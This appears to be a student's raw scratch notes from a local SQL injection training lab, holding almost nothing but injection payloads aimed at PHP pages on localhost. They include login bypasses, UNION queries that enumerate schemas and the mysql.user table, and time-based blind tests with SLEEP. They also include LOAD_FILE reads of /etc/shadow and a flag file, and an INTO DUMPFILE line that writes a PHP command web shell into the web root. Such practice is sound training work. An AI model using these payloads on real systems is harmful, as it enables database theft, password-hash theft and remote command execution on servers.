question 1:

### Username: "alice' OR 1=1;-- "
### Error I got:
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';--') AND (password = 'd41d8cd98f00b204e9800998ecf8427e')' at line 1

### Username: "alice'); -- "
### Success

question 2:
## "' OR 1=1; -- "
## "' ORDER BY (SELECT user FROM mysql.user); -- "
## "' UNION (SELECT 1, DATABASE(), VERSION(), CURRENT_USER(), 5); -- "

' UNION (SELECT 1, HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser, 5); -- 
SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser

' UNION (SELECT 1, user, 3, 4, 5 FROM mysql.user); -- 
SELECT user FROM mysql.user

' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_SCHEMA='sqlitraining'); -- 


' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'cyber_tableAAAAAAAAAAAAA'); -- 



' UNION (SELECT * FROM cyber_tableAAAAAAAAAAAAA ORDER BY 1); -- 

' UNION ((SELECT 1,2,3) FULL OUTER JOIN (SELECT * FROM cyber_tableAAAAAAAAAAAAA) ON TRUE); -- 
' UNION (SELECT 1,2,3,cyberId,cyberHour FROM cyber_tableAAAAAAAAAAAAA); -- 


' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES); -- 

' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_SCHEMA='secure'); -- 
' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'secure'); -- 


http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_SCHEMA='secure'); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'789b05678e7f955d2cf125b0c05616c9'); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'789b05678e7f955d2cf125b0c05616c9' AND COLUMN_NAME <> 'id' AND COLUMN_NAME <> 'random'); -- 

http://localhost:8000/blindsqli.php?user=%27%20UNION%20(SELECT%201,2,3,4,COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%20=%20N%27789b05678e7f955d2cf125b0c05616c9%27);%20--%20

id random 

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,COUNT(id) FROM N'789b05678e7f955d2cf125b0c05616c9'); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT * FROM N'789b05678e7f955d2cf125b0c05616c9' WHERE TRUE) 
http://localhost:8000/blindsqli.php?user='; SELECT SLEEP(50); -- 

http://localhost:8000/blindsqli.php?user=' UNION (SELECT IF(COUNT(random) >= 5, SELECT a FROM b, NULL) FROM 789b05678e7f955d2cf125b0c05616c9); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT IF(TRUE, SELECT a FROM b, NULL) FROM 789b05678e7f955d2cf125b0c05616c9); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SLEEP(10000)); -- 

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,SLEEP(2)); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT IF(COUNT(random) >= 5, SELECT a FROM b, NULL) FROM 789b05678e7f955d2cf125b0c05616c9); -- 
http://localhost:8000/blindsqli.php?user=' UNION (IF(TRUE, (SELECT 1,2,3,4,SLEEP(2)), NULL)); -- 
http://localhost:8000/blindsqli.php?user=' UNION (IF((SELECT COUNT(*) FROM 789b05678e7f955d2cf125b0c05616c9) >= 5, (SELECT 1,2,3,4,SLEEP(2)), NULL)); -- 

# THIS WORKS
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,IF(TRUE, SLEEP(2), NULL)); -- 


http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,IF((SELECT COUNT(*) FROM 789b05678e7f955d2cf125b0c05616c9) >= 5, SLEEP(2), NULL) FROM 789b05678e7f955d2cf125b0c05616c9); -- 


http://localhost:8000/blindsqli.php?user=' UNION (USE secure; SELECT 1,2,3,4,IF((SELECT COUNT(*) FROM 789b05678e7f955d2cf125b0c05616c9) >= 5, SLEEP(2), NULL)); --%20

## fuck yeah
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,(SELECT COUNT(*) FROM secure.789b05678e7f955d2cf125b0c05616c9); --%20


http://localhost:8000/blindsqli.php?user=' UNION (SELECT COUNT(*),COUNT(*),COUNT(*),COUNT(*),COUNT(*) FROM secure.789b05678e7f955d2cf125b0c05616c9); --%20
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 69,69,69,id,random FROM secure.789b05678e7f955d2cf125b0c05616c9); --%20



http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_SCHEMA='secure'); --
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_SCHEMA='secure'); -- 
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'789b05678e7f955d2cf125b0c05616c9'); -- 

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'789b05678e7f955d2cf125b0c05616c9'); --


http://localhost:8000/blindsqli.php?user=' UNION (SELECT 69,69,69,id,random FROM secure.789b05678e7f955d2cf125b0c05616c9 WHERE id <> 1 AND ID <> 2); --%20

http://localhost:8000/os_sqli.php?user=' UNION (SELECT 1,'Hello, World',3,'','' into outfile /home/hello_world.txt; SELECT 1,2,3,4,5); --%20

http://localhost:8000/os_sqli.php?user=%27%20UNION%20SELECT%201,"Hello,%20World",3,"",""%20into%20outfile%20/home/HelloWorld.txt;%20--%20%20

http://localhost:8000/blindsqli.php?user=' UNION (SELECT '','Hello, World','','','' INTO OUTFILE '/home/hello_world.txt' FIELDS TERMINATED BY '' LINES TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LIMIT 1); --%20

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 'Hello, World','','','','' INTO DUMPFILE '/home/hello_world.txt'); --%20
http://localhost:8000/blindsqli.php?user=' UNION (SELECT '<?php system($_GET["cmd"]); ?>','','','','' INTO DUMPFILE '/var/www/html/cmd.php'); --%20

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,LOAD_FILE('/home/flag.txt')); --%20

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,LOAD_FILE('/etc/shadow')); --%20
http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,USER()); --%20

http://localhost:8000/blindsqli.php?user=' UNION (LOAD DATA INFILE '/etc/shadow' INTO TABLE sqlitraining.users; SELECT 1,2,3,4,5)); --%20

LOAD FROM 'new_custs' INSERT INTO jason.customer;
LOAD DATA INFILE '/etc/shadow' INTO TABLE sqlitraining.users;

\xc9\xcb\xbf\x3d\xed\x6f\x72\xfd\x41\x59\x3d\xde\x4a\x3a\x73\x178\x4f\xbf\x2f\x73\x6f\xfe\xd6\xd5\x46\xb0\x26\xa7\x6a\xf8\xd5\x58\x1e\xb4\x7c\x68\xae\x20\x1a\x2f

' UNION (LOAD DATA INFILE '/etc/shadow' INTO TABLE sqlitraining.users; SELECT 1,2,3,4,5); -- 

http://localhost:8000/blindsqli.php?user=' UNION (SELECT * FROM INFILE '/etc/shadow'); --%20

http://localhost:8000/blindsqli.php?user=' UNION (SELECT 1,2,3,4,LOAD_FILE('/home/flag.txt')); --%20